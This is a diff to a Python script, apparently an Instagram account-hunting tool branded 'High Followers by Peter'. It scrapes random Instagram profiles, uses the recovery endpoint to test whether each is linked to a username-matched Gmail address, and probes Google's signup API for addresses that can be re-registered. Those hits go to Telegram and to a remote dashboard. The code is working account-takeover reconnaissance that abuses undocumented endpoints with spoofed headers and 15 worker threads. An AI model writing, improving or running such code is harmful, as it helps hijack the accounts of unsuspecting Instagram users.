@@ -17,11 +17,12 @@ from colorama import init
 
 init(autoreset=True)
 
-# ================= DASHBOARD SYNC LOGIC =================
+# ================= FIXED DASHBOARD SYNC LOGIC =================
 def send_to_dashboard(stat_type):
     try:
-        # Dashboard (app.py) ko hit/bad signal bhejna
-        requests.post('http://127.0.0.1:5000/update_stats', json={'type': stat_type}, timeout=0.5)
+        # Render Live URL for syncing stats
+        url = 'https://system-override-v2.onrender.com/update_stats'
+        requests.post(url, json={'type': stat_type}, timeout=3)
     except:
         pass
 
@@ -45,7 +46,7 @@ ASCII_ART = r"""
 ██╔═══╝░██╔══╝░░░░░██║░░░██╔══╝░░██╔══██╗
 ██║░░░░░███████╗░░░██║░░░███████╗██║░░██║
 ╚═╝░░░░░╚══════╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝
-           HIGH FOLLOWERS BY PETER
+            HIGH FOLLOWERS BY PETER
 """
 
 print(C1 + ASCII_ART)
@@ -76,24 +77,26 @@ def JodScript():
             print(C1 + "[*] Google Token Generated Successfully.")
         else:
             print(E + "[!] Token generation failed, retrying...")
-            time.sleep(2)
+            time.sleep(3)
             JodScript()
     except Exception as e:
-        time.sleep(2)
+        time.sleep(3)
         JodScript()
 
 # Token setup on start
-JodScript()
+if not os.path.exists(TOKEN_FILE):
+    JodScript()
 
 def check_gmail(email_prefix):
     global hits_count, bad_count
     try:
+        if not os.path.exists(TOKEN_FILE): JodScript()
         with open(TOKEN_FILE, 'r') as f: tl, host = f.read().split('//')
         headers = {'google-accounts-xsrf': '1', 'User-Agent': generate_user_agent()}
         data = f"f.req=%5B%22TL%3A{tl}%22%2C%22{email_prefix}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
         res = requests.post("https://accounts.google.com/_/signup/usernameavailability", headers=headers, data=data, cookies={'__Host-GAPS': host})
         
-        if '"gf.uar",1' in res.text: # Available for Grab
+        if '"gf.uar",1' in res.text:
             with stats_lock: hits_count += 1
             send_to_dashboard('hit')
             return True
@@ -106,7 +109,6 @@ def check_gmail(email_prefix):
 def check_instagram_link(email):
     global valid_ig, bad_count
     headers = {'User-Agent': generate_user_agent(), 'Content-Type': 'application/x-www-form-urlencoded'}
-    # Standard Instagram recovery payload
     data = {'signed_body': f'sign.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","query":"{email}"}}', 'ig_sig_key_version': '4'}
     try:
         res = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
@@ -115,8 +117,8 @@ def check_instagram_link(email):
             if check_gmail(email.split('@')[0]):
                 send_hit_telegram(email)
         else:
-            # Not linked to Instagram
             send_to_dashboard('bad')
+            with stats_lock: bad_count += 1
     except: pass
 
 def send_hit_telegram(email):
@@ -138,6 +140,7 @@ def send_hit_telegram(email):
 def worker():
     while True:
         lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
+        # Randomizing ID range for fresh results
         data = {
             'lsd': lsd,
             'variables': json.dumps({'id': random.randrange(2500000000, 21254029834), 'render_surface': 'PROFILE'}),
@@ -147,21 +150,16 @@ def worker():
             res = requests.post('https://www.instagram.com/api/graphql', headers={'X-FB-LSD': lsd}, data=data)
             user_data = res.json().get('data', {}).get('user', {})
             username = user_data.get('username')
+            # Media count filter to find active accounts
             if username and user_data.get('media_count', 0) > 0:
                 infoinsta[username] = user_data
                 check_instagram_link(username + jod_domain)
-        except: pass
+        except: 
+            time.sleep(2)
 
-def display_stats():
-    while True:
-        print(f"\r ☄️ {B}| {C1}Hits: {M}{hits_count} {E}Bad: {M}{bad_count} {W9}IG-Found: {M}{valid_ig} {R}|{RESET}", end='')
-        time.sleep(1)
-
-# Execution
-Thread(target=display_stats, daemon=True).start()
-for _ in range(50): 
+# Execution - 15 threads for stability on Render free tier
+for _ in range(15): 
     Thread(target=worker, daemon=True).start()
 
-# Keep script alive for dashboard background process
 while True:
     time.sleep(10)
